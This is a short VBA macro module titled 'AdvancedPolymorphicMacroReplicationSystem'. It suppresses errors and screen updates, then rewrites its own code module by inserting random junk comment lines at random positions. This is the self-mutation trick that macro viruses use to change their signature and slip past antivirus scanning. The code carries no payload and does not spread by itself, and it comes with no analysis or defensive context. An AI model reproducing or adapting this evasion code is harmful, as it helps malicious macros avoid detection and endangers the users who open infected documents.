Attribute VB_Name = "APMRS"
Sub AdvancedPolymorphicMacroReplicationSystem()

    On Error Resume Next

    Application.ScreenUpdating = False

    Set Current = MacroContainer

    For Grow = 1 To 20
        Number = Current.VBProject.VBComponents("APMRS").CodeModule.ProcCountLines("AdvancedPolymorphicMacroReplicationSystem", vbext_pk_Proc)
        RandomLine = Int(Rnd() * Number + 1)
        RemarkLength = Int(Rnd() * 40 + 1)

            For Length = 1 To RemarkLength
                Remark = Remark + Chr$(Int((90 - 65 + 1) * Rnd + 65))
            Next Length

        Current.VBProject.VBComponents("APMRS").CodeModule.InsertLines RandomLine, vbTab & "Rem " & Remark
        Remark = ""

    Next Grow

End Sub
